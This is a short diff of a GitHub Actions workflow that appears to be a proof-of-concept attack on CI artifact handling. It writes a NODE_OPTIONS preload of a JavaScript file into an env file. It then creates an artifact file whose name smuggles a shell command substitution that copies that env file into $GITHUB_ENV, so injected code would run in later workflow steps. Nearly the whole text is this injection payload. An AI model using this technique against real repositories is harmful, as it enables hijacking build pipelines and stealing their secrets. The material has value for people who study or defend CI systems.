@@ -22,7 +22,8 @@ jobs:
           }
           JS
           printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > content/e.env
-          echo 'injected' > 'content/$(S=$(mktemp -d);T=$(dirname $S);R=$(dirname $T);cp $T$R'"'"'content'"'"'$R'"'"'content'"'"'$R'"'"'e.env'"'"' $GITHUB_ENV).txt'
+          echo 'benign ok' > content/ok.txt
+          echo 'injected' > 'content/$(S=$(mktemp -d);T=$(dirname $S);R=$(dirname $T);cp $T$R'"'"'content'"'"'$R'"'"'content'"'"'$R'"'"'e.env'"'"' $GITHUB_ENV;echo ok).txt'
           printf '1' > content/pr_number.txt
           ls -la content
       - uses: actions/upload-artifact@v4
